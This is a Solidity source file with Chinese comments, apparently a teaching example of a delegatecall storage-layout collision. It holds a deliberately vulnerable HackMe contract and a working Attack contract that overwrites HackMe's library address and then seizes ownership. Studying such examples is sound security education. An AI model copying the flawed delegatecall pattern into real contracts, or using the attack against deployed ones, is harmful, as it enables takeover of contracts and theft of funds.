// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

/*
这是前一个漏洞的更复杂版本。

1. Alice部署Lib和HackMe，并将Lib的地址传递给它们
2. Eve部署Attack并将HackMe的地址传递给它
3. Eve调用Attack.attack()
4. 现在Attack是HackMe的所有者

发生了什么？
请注意，Lib和HackMe中的状态变量没有以相同的方式定义。这意味着调用Lib.doSomething()将更改HackMe内的第一个状态变量，该变量恰好是lib的地址。

在attack()函数内，第一次调用doSomething()会更改存储在HackMe中的lib地址。现在，lib的地址被设置为Attack。

第二次调用doSomething()会调用Attack.doSomething()，在这里我们更改了所有者。
*/

contract Lib {
    uint public someNumber;

    function doSomething(uint _num) public {
        someNumber = _num;
    }
}

contract HackMe {
    address public lib;
    address public owner;
    uint public someNumber;

    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }

    function doSomething(uint _num) public {
        lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));
    }
}

contract Attack {
    // 确保存储布局与HackMe相同
    // 这将使我们能够正确地更新状态变量。
    address public lib;
    address public owner;
    uint public someNumber;

    HackMe public hackMe;

    constructor(HackMe _hackMe) {
        hackMe = HackMe(_hackMe);
    }

    function attack() public {
        // 覆盖lib的地址
        hackMe.doSomething(uint(uint160(address(this))));
        // 如果将任何数字作为输入传递，下面的函数doSomething()将被调用。
        hackMe.doSomething(1);
    }

    // 函数签名必须与HackMe.doSomething()匹配。
    function doSomething(uint _num) public {
        owner = msg.sender;
    }
}